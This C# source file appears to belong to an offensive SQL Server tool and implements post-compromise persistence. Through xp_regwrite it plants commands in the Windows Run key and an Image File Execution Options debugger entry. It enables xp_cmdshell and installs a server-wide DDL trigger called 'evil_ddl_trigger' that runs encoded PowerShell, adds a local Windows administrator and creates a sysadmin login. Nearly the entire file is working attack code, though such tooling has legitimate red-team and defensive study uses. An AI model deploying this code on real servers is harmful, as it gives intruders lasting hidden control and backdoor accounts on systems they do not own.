using System;
using System.Collections.Generic;
using System.Linq;
using SharpUpSQL.Common;
using SharpUpSQL.Core.Auth;
using SharpUpSQL.Core.Execution;
using SharpUpSQL.Core.Helpers;
using SharpUpSQL.Core.Output;

namespace SharpUpSQL.Persistence
{
    public sealed class SqlPersistResult : SqlInstanceResult
    {
        public string Status { get; set; }
        public string Message { get; set; }
    }

    internal static class PersistenceEngine
    {
        internal static IEnumerable<SqlPersistResult> GetSqlPersistRegRun(
            SqlConnectionOptions options,
            string instance,
            string name,
            string command,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            foreach (var result in ExecuteSysadminAction(options, instance, verbose, suppressVerbose, (inst, opts) =>
            {
                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : Attempting to write value: " + name);
                    verbose.Write(inst + " : Attempting to write command: " + command);
                }

                var query = @"
EXEC master..xp_regwrite
    @rootkey     = 'HKEY_LOCAL_MACHINE',
    @key         = 'Software\Microsoft\Windows\CurrentVersion\Run',
    @value_name  = '" + EscapeSql(name) + @"',
    @type        = 'REG_SZ',
    @value       = '" + EscapeSql(command) + "'";

                SqlEnumerationEngine.GetSqlQuery(opts, query, inst, verbose, true).ToList();

                var checkQuery = @"
DECLARE @CheckValue SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'Software\Microsoft\Windows\CurrentVersion\Run',
    @value_name = N'" + EscapeSql(name) + @"',
    @value = @CheckValue OUTPUT
SELECT CheckValue = @CheckValue";

                var check = SqlEnumerationEngine.GetSqlQuery(opts, checkQuery, inst, verbose, true).FirstOrDefault();
                var checkValue = check != null ? SqlValueFormatter.Format(check["CheckValue"]) : string.Empty;
                var written = !string.IsNullOrEmpty(checkValue) && checkValue.Length >= 2;

                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : " + (written
                        ? "Registry entry written."
                        : "Fail to write to registry due to insufficient privileges."));
                    verbose.Write(inst + " : Done.");
                }

                return new SqlPersistResult
                {
                    Status = written ? "Written" : "Failed",
                    Message = written ? "Registry Run key updated." : "Failed to write registry value."
                };
            }))
            {
                yield return result;
            }
        }

        internal static IEnumerable<SqlPersistResult> GetSqlPersistRegDebugger(
            SqlConnectionOptions options,
            string instance,
            string fileName,
            string command,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            foreach (var result in ExecuteSysadminAction(options, instance, verbose, suppressVerbose, (inst, opts) =>
            {
                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : Attempting to write debugger: " + fileName);
                    verbose.Write(inst + " : Attempting to write command: " + command);
                }

                var key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" + fileName;
                var query = @"
EXEC master..xp_regwrite
    @rootkey     = 'HKEY_LOCAL_MACHINE',
    @key         = '" + EscapeSql(key) + @"',
    @value_name  = 'Debugger',
    @type        = 'REG_SZ',
    @value       = '" + EscapeSql(command) + "'";

                SqlEnumerationEngine.GetSqlQuery(opts, query, inst, verbose, true).ToList();

                var checkQuery = @"
DECLARE @CheckValue SYSNAME
EXECUTE master.dbo.xp_regread
    @rootkey = N'HKEY_LOCAL_MACHINE',
    @key = N'" + EscapeSql(key) + @"',
    @value_name = N'Debugger',
    @value = @CheckValue OUTPUT
SELECT CheckValue = @CheckValue";

                var check = SqlEnumerationEngine.GetSqlQuery(opts, checkQuery, inst, verbose, true).FirstOrDefault();
                var checkValue = check != null ? SqlValueFormatter.Format(check["CheckValue"]) : string.Empty;
                var written = !string.IsNullOrEmpty(checkValue) && checkValue.Length >= 2;

                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : " + (written
                        ? "Registry entry written."
                        : "Fail to write to registry due to insufficient privileges."));
                    verbose.Write(inst + " : Done.");
                }

                return new SqlPersistResult
                {
                    Status = written ? "Written" : "Failed",
                    Message = written ? "Image File Execution Options debugger set." : "Failed to write registry value."
                };
            }))
            {
                yield return result;
            }
        }

        internal static IEnumerable<SqlPersistResult> GetSqlPersistTriggerDdl(
            SqlConnectionOptions options,
            string instance,
            string newSqlUser,
            string newSqlPass,
            string newOsUser,
            string newOsPass,
            string psCommand,
            bool remove,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            foreach (var result in ExecuteSysadminAction(options, instance, verbose, suppressVerbose, (inst, opts) =>
            {
                EnableXpCmdshell(opts, inst, verbose, suppressVerbose);
                var svcAdmin = IsServiceAccountLocalAdmin(opts, inst, verbose, suppressVerbose);

                var queryPs = BuildPsCommandPayload(psCommand, svcAdmin, inst, verbose, suppressVerbose);
                var queryOs = BuildOsUserPayload(newOsUser, newOsPass, svcAdmin, inst, verbose, suppressVerbose);
                var querySql = BuildSqlSysadminPayload(newSqlUser, newSqlPass, inst, verbose, suppressVerbose);

                if (remove)
                {
                    if (!suppressVerbose)
                    {
                        verbose.Write(inst + " : Removing trigger named evil_DDL_trigger...");
                    }

                    var removeQuery = @"
IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger')
    DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER";

                    SqlEnumerationEngine.GetSqlQuery(opts, removeQuery, inst, verbose, true).ToList();
                    if (!suppressVerbose)
                    {
                        verbose.Write(inst + " : The evil_ddl_trigger trigger has been been removed.");
                        verbose.Write(inst + " : All done.");
                    }

                    return new SqlPersistResult
                    {
                        Status = "Removed",
                        Message = "DDL trigger evil_ddl_trigger removed."
                    };
                }

                if (string.IsNullOrEmpty(queryPs) && string.IsNullOrEmpty(queryOs) && string.IsNullOrEmpty(querySql))
                {
                    if (!suppressVerbose)
                    {
                        verbose.Write(inst + " : No options were provided.");
                    }

                    return new SqlPersistResult
                    {
                        Status = "Skipped",
                        Message = "No persistence payload options were provided."
                    };
                }

                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : Creating trigger...");
                }

                var createQuery = @"
IF EXISTS (SELECT * FROM sys.server_triggers WHERE name = 'evil_ddl_trigger')
    DROP TRIGGER [evil_ddl_trigger] ON ALL SERVER
exec('CREATE Trigger [evil_ddl_trigger]
on ALL Server
For DDL_SERVER_LEVEL_EVENTS
AS
" + queryOs + querySql + queryPs + "')";

                SqlEnumerationEngine.GetSqlQuery(opts, createQuery, inst, verbose, true).ToList();

                if (!suppressVerbose)
                {
                    verbose.Write(inst + " : The evil_ddl_trigger trigger has been added. It will run with any DDL event.");
                    verbose.Write(inst + " : All done.");
                }

                return new SqlPersistResult
                {
                    Status = "Created",
                    Message = "DDL trigger evil_ddl_trigger created."
                };
            }))
            {
                yield return result;
            }
        }

        private static IEnumerable<SqlPersistResult> ExecuteSysadminAction(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose,
            Func<string, SqlConnectionOptions, SqlPersistResult> action)
        {
            instance = string.IsNullOrWhiteSpace(instance) ? Environment.MachineName : instance;
            options = options.Clone();
            options.Instance = instance;

            var test = ConnectionTester.Test(instance, null, null, options, verbose, suppressVerbose);
            if (!string.Equals(test.Status, "Accessible", StringComparison.OrdinalIgnoreCase))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Connection Failed.");
                }

                yield break;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Connection Success.");
            }

            if (!IsSysadmin(options, instance, verbose, suppressVerbose))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : This function requires sysadmin privileges. Done.");
                }

                yield break;
            }

            var result = action(instance, options);
            SqlValueFormatter.StampInstance(result, instance);
            yield return result;
        }

        private static bool IsSysadmin(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            var info = SqlEnumerationEngine.GetSqlServerInfo(options, instance, verbose, true).FirstOrDefault();
            return info != null &&
                   (string.Equals(info.IsSysadmin, "1", StringComparison.OrdinalIgnoreCase) ||
                    string.Equals(info.IsSysadmin, "Yes", StringComparison.OrdinalIgnoreCase));
        }

        private static void EnableXpCmdshell(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Enabling 'Show Advanced Options', if required...");
            }

            SqlEnumerationEngine.GetSqlQuery(options,
                "IF (select value_in_use from sys.configurations where name = 'Show Advanced Options') = 0 " +
                "EXEC ('sp_configure ''Show Advanced Options'',1;RECONFIGURE')",
                instance,
                verbose,
                true).ToList();

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Enabling 'xp_cmdshell', if required...");
            }

            SqlEnumerationEngine.GetSqlQuery(options,
                "IF (select value_in_use from sys.configurations where name = 'xp_cmdshell') = 0 " +
                "EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE')",
                instance,
                verbose,
                true).ToList();
        }

        private static bool IsServiceAccountLocalAdmin(
            SqlConnectionOptions options,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Checking if service account is a local administrator...");
            }

            const string serviceQuery = @"
DECLARE @SQLServerInstance varchar(250)
IF @@SERVICENAME = 'MSSQLSERVER'
    SET @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
ELSE
    SET @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$' + cast(@@SERVICENAME as varchar(250))

DECLARE @ServiceaccountName varchar(250)
EXECUTE master.dbo.xp_instance_regread
    N'HKEY_LOCAL_MACHINE', @SQLServerInstance,
    N'ObjectName', @ServiceaccountName OUTPUT, N'no_output'
SELECT @ServiceaccountName as SvcAcct";

            var svcRow = SqlEnumerationEngine.GetSqlQuery(options, serviceQuery, instance, verbose, true).FirstOrDefault();
            var serviceAccount = svcRow != null
                ? SqlValueFormatter.Format(svcRow["SvcAcct"]).Replace(".\\", string.Empty)
                : string.Empty;

            var adminRows = SqlEnumerationEngine.GetSqlQuery(options,
                "EXEC master..xp_cmdshell 'net localgroup Administrators';",
                instance,
                verbose,
                true).ToList();

            var isLocalSystem = string.Equals(serviceAccount, "LocalSystem", StringComparison.OrdinalIgnoreCase);
            var inAdminGroup = adminRows.Any(row =>
            {
                var line = SqlValueFormatter.Format(row.Columns.Values.FirstOrDefault());
                return line.IndexOf(serviceAccount, StringComparison.OrdinalIgnoreCase) >= 0;
            });

            var svcAdmin = isLocalSystem || inAdminGroup;
            if (!suppressVerbose)
            {
                verbose.Write(instance + " : The service account " + serviceAccount +
                              (svcAdmin
                                  ? " has local administrator privileges."
                                  : " does NOT have local administrator privileges."));
            }

            return svcAdmin;
        }

        private static string BuildPsCommandPayload(
            string psCommand,
            bool svcAdmin,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (string.IsNullOrWhiteSpace(psCommand))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Note: No PowerShell will be executed, because the parameters weren't provided.");
                }

                return string.Empty;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Creating encoding PowerShell payload...");
                if (!svcAdmin)
                {
                    verbose.Write(instance + " : Note: PowerShell won't be able to take administrative actions due to the service account configuration.");
                }
            }

            var encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(psCommand));
            if (encoded.Length > 8100)
            {
                if (!suppressVerbose)
                {
                    verbose.Write("PowerShell encoded payload is too long so the PowerShell command will not be added.");
                }

                return string.Empty;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Payload generated.");
            }

            return "EXEC master..xp_cmdshell ''PowerShell -enc " + encoded + "'';";
        }

        private static string BuildOsUserPayload(
            string newOsUser,
            string newOsPass,
            bool svcAdmin,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (string.IsNullOrWhiteSpace(newOsUser))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Note: No OS admin will be created, because the parameters weren't provided.");
                }

                return string.Empty;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Creating payload to add OS user...");
            }

            if (!svcAdmin)
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : The service account does not have local administrator privileges so no OS admin can be created.  Aborted.");
                }

                return string.Empty;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Payload generated.");
            }

            return "EXEC master..xp_cmdshell ''net user " + EscapeSql(newOsUser) + " " + EscapeSql(newOsPass ?? string.Empty) +
                   " /add & net localgroup administrators /add " + EscapeSql(newOsUser) + "'';";
        }

        private static string BuildSqlSysadminPayload(
            string newSqlUser,
            string newSqlPass,
            string instance,
            VerboseWriter verbose,
            bool suppressVerbose)
        {
            if (string.IsNullOrWhiteSpace(newSqlUser))
            {
                if (!suppressVerbose)
                {
                    verbose.Write(instance + " : Note: No sysadmin will be created, because the parameters weren't provided.");
                }

                return string.Empty;
            }

            if (!suppressVerbose)
            {
                verbose.Write(instance + " : Generating payload to add sysadmin...");
                verbose.Write(instance + " : Payload generated.");
            }

            return "IF NOT EXISTS (SELECT * FROM sys.syslogins WHERE name = ''" + EscapeSql(newSqlUser) + "'') " +
                   "exec(''CREATE LOGIN " + EscapeSql(newSqlUser) + " WITH PASSWORD = ''''" + EscapeSql(newSqlPass ?? string.Empty) +
                   "'''';EXEC sp_addsrvrolemember ''''" + EscapeSql(newSqlUser) + "'''', ''''sysadmin'''';'')";
        }

        private static string EscapeSql(string value)
        {
            return (value ?? string.Empty).Replace("'", "''");
        }
    }
}
